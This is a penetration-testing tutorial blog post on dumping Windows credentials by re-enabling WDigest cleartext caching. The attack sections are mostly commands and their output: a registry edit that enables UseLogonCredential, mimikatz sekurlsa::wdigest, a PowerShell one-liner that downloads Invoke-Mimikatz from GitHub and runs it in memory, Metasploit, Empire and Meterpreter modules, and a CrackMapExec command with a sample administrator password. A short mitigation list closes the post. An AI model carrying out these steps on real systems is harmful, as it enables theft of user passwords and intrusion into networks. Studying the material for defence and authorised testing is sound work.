<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/credential-dumping/" rel="category tag">Credential Dumping</a></span>            </div>
            <h1 class="post-title entry-title">Credential Dumping: WDigest</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/credential-dumping-wdigest/" rel="bookmark"><time class="entry-date published" datetime="2020-04-06T07:31:14+00:00">April 6, 2020</time><time class="updated" datetime="2025-05-30T08:14:18+00:00">May 30, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p class="ai-optimize-6 ai-optimize-introduction"><span style="color: #000000;">This is our third article in the series of Credential Dumping. In this article, we will manipulate WDigest.dll to retrieve the system credentials. The methods used in this article are for both internal and external penetration testing.</span></p>
<h3 class="ai-optimize-7"><span style="color: #800000;">Table of Contents</span></h3>
<ul>
<li class="ai-optimize-8"><span style="color: #000000;">Introduction to WDigest</span></li>
<li class="ai-optimize-9"><span style="color: #000000;">Working of WDigest.dll</span></li>
<li class="ai-optimize-10"><span style="color: #000000;">Manual</span></li>
<li class="ai-optimize-11"><span style="color: #000000;">PowerShell</span></li>
<li class="ai-optimize-12"><span style="color: #000000;">Powershell via meterpreter</span></li>
<li class="ai-optimize-13"><span style="color: #000000;">Metasploit Framework</span></li>
<li class="ai-optimize-14"><span style="color: #000000;">PowerShell Empire</span></li>
<li class="ai-optimize-15"><span style="color: #000000;">CrackMapExec</span></li>
<li class="ai-optimize-16"><span style="color: #000000;">Mitigation</span></li>
<li class="ai-optimize-17"><span style="color: #000000;">TL; DR</span></li>
</ul>
<h3 class="ai-optimize-18"><span style="color: #800000;">Introduction to Wdigest</span></h3>
<p class="ai-optimize-19"><span style="color: #000000;">WDigest.dll was launched through Windows XP was specifically crafted for HTTP and SASL authentication. Basically, it’s work was to send confirmation of secret keys in order to authenticate the said protocol. The security attributes of NTLM protocol were applied to this DLL file as it’s a challenge/response protocol too. WDigest protocol is enabled in Windows XP — Windows 8.0 and Windows Server 2003 — Windows Server 2012 by default, which allows credentials to be saved in clear text in LSAS file. Windows 10, Windows Server 2012 R2 and Windows Server 2016 doesn’t have this protocol active. And it also released a patch for earlier versions.</span></p>
<h3 class="ai-optimize-20"><span style="color: #800000;">Working of WDigest.dll</span></h3>
<p class="ai-optimize-21"><span style="color: #000000;">As it is a challenge-response protocol, it important to understand how it works. Such protocols demand a validating server that creates a challenge for them. The said challenge has incalculable data. A is key is obtained from the user’s password which is further used to encrypt the challenge and to craft a response. A reliable service can then validate the user processes by comparing to the encrypted response that is received by the client and if the responses match, then the user is authenticated.</span></p>
<p class="ai-optimize-22"><span style="color: #000000;">Now that we have understood what exactly a WDigest protocol is and how it works, let’s get to practical how to exploit it.</span></p>
<h3 class="ai-optimize-23"><span style="color: #800000;">Manual</span></h3>
<p class="ai-optimize-24"><span style="color: #000000;">Our first method to exploit WDigest in to dump the desired credentials is manual. Such a method comes handy in white box pentesting. In this method, download mimikatz and run the following commands :</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">privilege::debug 
sekrusla::wdigest</pre>
<p><img fetchpriority="high" decoding="async" class="alignnone" src="https://1.bp.blogspot.com/-vzGHx-YBGAg/XorWjLhJqnI/AAAAAAAAjZQ/vQip9jEtTHw0-mGqcqH4X1BB9TqFlkbAgCLcBGAsYHQ/s1600/0.png" alt="WDigest" width="632" height="598"/></p>
<p class="ai-optimize-25"><span style="color: #000000;">As you can then see that the result of the above commands didn’t bear a fruit because WDigest protocol wasn’t active. To activate the said protocol, use the following command:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-TFPHg0z1N5A/XorWjMDMZ-I/AAAAAAAAjZU/PesD4OMRo0s71usHNAeJUQfjT_d61w6LACLcBGAsYHQ/s1600/1.png"/></p>
<p class="ai-optimize-26"><span style="color: #000000;">The above command will create a file called <strong>UseLogonCredetnial</strong> in the WDigest folder in the registry and simultaneously sets it binary value to 1 as you can in the image below:</span></p>
<p><img decoding="async" class="alignnone" src="https://1.bp.blogspot.com/-6i6vm8ehj1k/XorWkXCpm6I/AAAAAAAAjZg/986CJ5G6cfILEB3rM4yhUIT1JlJjTbYsACLcBGAsYHQ/s1600/2.png" alt="WDigest" width="697" height="238"/></p>
<p class="ai-optimize-27"><span style="color: #000000;">The above step has just enabled WDigest in the system. Which will allow the password to be saved in memory that too in clear texts. And now these passwords can be retrieved sneakily as you will see further in this article.</span></p>
<p class="ai-optimize-28"><span style="color: #000000;">For now, we need to update the policy that we just entered in the registry using the following command:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">gpupdate /force</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-6rAkCF1rCFg/XorWkoek8hI/AAAAAAAAjZo/UoSvP5HIUyEMhP6Qku9NQE9w5ifzgZLewCLcBGAsYHQ/s1600/3.png"/></p>
<p class="ai-optimize-29"><span style="color: #000000;">Now, if you launch mimikatz and run the following commands then you will have the credentials.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">privilege::debug
sekurlsa::wdigest</pre>
<pre class="lang:default decode:true"><img decoding="async" class="alignnone" src="https://1.bp.blogspot.com/-HsdsbAG7uQg/XorWk64ihFI/AAAAAAAAjZs/CktI0-dqoj820hXd_wskoROxZbbUF8inACLcBGAsYHQ/s1600/4.png" alt="WDigest" width="708" height="398"/></pre>
<h3 class="ai-optimize-30"><span style="color: #800000;">PowerShell </span></h3>
<p class="ai-optimize-31"><span style="color: #000000;">In this method, we will be invoking PowerShell scripts in the system. This script will further help us get our hands on the credentials. </span></p>
<p class="ai-optimize-32"><a href="https://raw.githubusercontent.com/HarmJ0y/Misc-PowerShell/master/Invoke-WdigestDowngrade.ps1">Download WdigestDowngrade.ps1</a></p>
<p class="ai-optimize-33"><span style="color: #000000;">Simply launch the PowerShell Command Prompt and run the following commands:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">Import-Module .\WdigestDowngrade.ps1
Invoke-WdigestDowngrade
reg query HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-H1cI8BsEo28/XorWlPR5i_I/AAAAAAAAjZw/v0OVAJWmKgkmT8vr7ODQcVsXPA2batYlgCLcBGAsYHQ/s1600/5.png"/></p>
<p class="ai-optimize-34"><span style="color: #000000;">Once the above commands are executed successfully, run the following command to dump the credentials.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds</pre>
<p><img loading="lazy" decoding="async" class="alignnone" src="https://1.bp.blogspot.com/-dI3_fJRgcVY/XorWlXGNJEI/AAAAAAAAjZ0/hj8JghzzuIc8JriHTWuDHPqr8NnswucCwCLcBGAsYHQ/s1600/6.png" alt="WDigest" width="654" height="496"/></p>
<p class="ai-optimize-35"><span style="color: #000000;">And as you can see, we got the credentials.</span></p>
<h3 class="ai-optimize-36"><span style="color: #800000;">PowerShell via Meterpreter</span></h3>
<p class="ai-optimize-37"><span style="color: #000000;">In this method, we will be invoking PowerShell script in our meterpreter session. This script will further help us get our hands on the credentials. When you have a meterpreter session, run the following commands to create the UseLogonCredential file and make changes in the registry key.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">reg enumkey -k HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest
load powershell
powershell_import /root/Desktop/Invoke-WdigestDowngrade.ps1
powershell_execute Invoke-WdigestDowngrade</pre>
<pre class="lang:default decode:true"><img decoding="async" src="https://1.bp.blogspot.com/-k4hzJI0lufE/XorWl2vMa2I/AAAAAAAAjZ4/bpaRrrog7UcyqCVzTybWgFwnVKgorTJiACLcBGAsYHQ/s1600/7.png"/></pre>
<p class="ai-optimize-38"><span style="color: #000000;">After the above commands create the UseLogonCredential file as required and then you can launch mimikatz to dump the credentials using the following commands:</span></p>
<p class="ai-optimize-39"><a href="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1">Download Invoke Mimikatz.ps1</a></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">load powershell 
powershell_import /root/Invoke-Mimikatz.ps1 
powershell_execute Invoke-Mimikatz -CredsDump</pre>
<p><img loading="lazy" decoding="async" class="alignnone" src="https://1.bp.blogspot.com/-BGokDvbpx-M/XorWl_Tv0PI/AAAAAAAAjZ8/4z66f6FjNZMPRBlA1ap0EBvJAOdOq8N_gCLcBGAsYHQ/s1600/8.png" alt="WDigest" width="681" height="545"/></p>
<h3 class="ai-optimize-40"><span style="color: #800000;">Metasploit Framework</span></h3>
<p class="ai-optimize-41"><span style="color: #000000;">Our next method is an excellent method to dump the credentials remotely which often a requirement in grey box pentesting. Once you have your meterpreter session via Metasploit, remember to background the session and then you can execute wdigest_caching exploit to make the changes in WDigest folder which we just did manually in our previous method by using the following commands:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">use post/windows/manage/wdigest_caching
set session 1
execute</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-MJJoqRUtB_E/XorWmK2i8eI/AAAAAAAAjaA/bijTQ7C0DgIO4eLQyKxjYwMebr31hA81gCLcBGAsYHQ/s1600/9.png"/></p>
<p class="ai-optimize-42"><span style="color: #000000;">Then further use the load kiwi module to dump the credentials. For doing so, type :</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">load kiwi
creds_wdigest</pre>
<p><img loading="lazy" decoding="async" class="alignnone" src="https://1.bp.blogspot.com/-U8bC1JgQWGc/XorWjNsH4EI/AAAAAAAAjZY/CYbdkFhsWO4LIdVaT8IwTv8ZfKTgUrqqgCLcBGAsYHQ/s1600/10.png" alt="WDigest" width="692" height="362"/></p>
<p class="ai-optimize-43"><span style="color: #000000;">And yes! We got our credentials.</span></p>
<h3 class="ai-optimize-44"><span style="color: #800000;">PowerShell Empire</span></h3>
<p class="ai-optimize-45"><span style="color: #000000;">When you have a session through Empire, use the post exploit <strong>wdigest_downgrade</strong> to create the <strong>UseLogonCredential</strong> file in wdigest folder and its registry key value i.e. 1 with the help of following commands:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">usemodule management/wdigest_downgrade*
execute</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-SoSV3KkXECs/XorWjx6WL2I/AAAAAAAAjZc/LHzU-DRarZYkbgIo4Eui0t1tZv0OSEKwgCLcBGAsYHQ/s1600/11.png"/></p>
<p class="ai-optimize-46"><span style="color: #000000;">Once the above post exploit is executed successfully, you can use another build in post exploit to dump the credentials with the following set of commands:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">usemodule credentials/mimikatz/command*
set Command sekurlsa::wdigest
execute</pre>
<p><img loading="lazy" decoding="async" class="alignnone" src="https://1.bp.blogspot.com/-7u_yqpsa9JE/XorWkU6IwoI/AAAAAAAAjZk/Mhx1gVdaCP8S4c07Y_kYC5z58PdV9k29ACLcBGAsYHQ/s1600/12.png" alt="WDigest" width="724" height="712"/></p>
<p class="ai-optimize-47"><span style="color: #000000;">And after the execution of the above command, you have the credentials.</span></p>
<h3 class="ai-optimize-48"><span style="color: #800000;">CrackMapExec</span></h3>
<p class="ai-optimize-49"><span style="color: #000000;">CrackMapExec is a really sleek tool that can be installed with a simple apt install and it runs very swiftly. This tool creates the registry key due to which passwords are stored in memory as discussed previously. It requires a bunch of things.</span></p>
<p class="ai-optimize-50"><span style="color: #000000;"><strong>Requirements:</strong></span></p>
<p class="ai-optimize-51"><span style="color: #000000;"><strong>Username:</strong> Administrator</span></p>
<p class="ai-optimize-52"><span style="color: #000000;"><strong>Password:</strong> Ignite@987</span></p>
<p class="ai-optimize-53"><span style="color: #000000;"><strong>IP Address:</strong> 192.168.1.105</span></p>
<p class="ai-optimize-54"><span style="color: #000000;"><strong>Syntax: crackmapexec smb [IP Address] -u ‘[Username]’ -p ‘[Password]’ -M wdigest -o ACTION=enable</strong></span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">crackmapexec smb 192.168.1.105 -u 'Administrator' -p 'Ignite@987' -M wdigest -o ACTION=enable</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-O5Qo7vpGo-c/XrQGxzZwdbI/AAAAAAAAj7w/7X3qfgH29VwQitDSVenaS22RpNS51eQGgCLcBGAsYHQ/s1600/32.png" border="0" data-original-height="85" data-original-width="945"/></p>
<p class="ai-optimize-55"><strong><span style="color: #000000;">Read More: <a href="https://www.hackingarticles.in/lateral-moment-on-active-directory-crackmapexec/">Lateral Moment on Active Directory: CrackMapExec</a></span></strong></p>
<h3 class="ai-optimize-56"><span style="color: #800000;">Mitigation</span></h3>
<p class="ai-optimize-57"><span style="color: #000000;">Following are the steps one can take in order to secure themselves from this scenario:</span></p>
<ul>
<li class="ai-optimize-58"><span style="color: #000000;">Make sure the there is no UseLogonCredential file in your system</span></li>
<li class="ai-optimize-59"><span style="color: #000000;">If you are using the older versions of windows then make sure that windows us updates with the patch</span></li>
<li class="ai-optimize-60"><span style="color: #000000;">UseLogonCredential registry keys values should be set to 0 to completely disable this protocol.</span></li>
<li class="ai-optimize-61"><span style="color: #000000;">Regularly check the registry key value to make sure that you have not been the victim.</span><strong style="color: #000000;"> </strong></li>
</ul>
<h3 class="ai-optimize-62"><span style="color: #800000;">TL; DR</span></h3>
<p class="ai-optimize-63"><span style="color: #000000;">Understanding the very basics of your operating systems such as windows, allow you to be more secure in this cyber world. Knowing how endpoints are put together to work perfectly for your convenience is important as a seemingly minor change can make you vulnerable. Such as WDigest saves all the passwords in memory on the clear text which puts the credentials of the user at risk. And this thought made us take a stab on credential dumping by manipulating WDigest. So, through with mimikatz, Metasploit framework and other such tools that we have mentioned above can leverage your credentials both locally and remotely and can even allow the attacker to use them to their advantage. </span></p>
<p class="ai-optimize-64"><span style="color: #000000;">An attacker who can get administrator privileges of your system can modify the values in the registry and dump the credentials as shown in the article above using Mimikatz, Metasploit, Empire, and PowerShell scripts.</span></p>
<p class="ai-optimize-65"><strong>Author</strong>: <strong>Yashika Dhir</strong> is a passionate Researcher and Technical Writer at Hacking Articles. She is a hacking enthusiast. contact <strong><a class="broken_link" href="https://www.linkedin.com/in/yashika-dhir/">here</a></strong></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
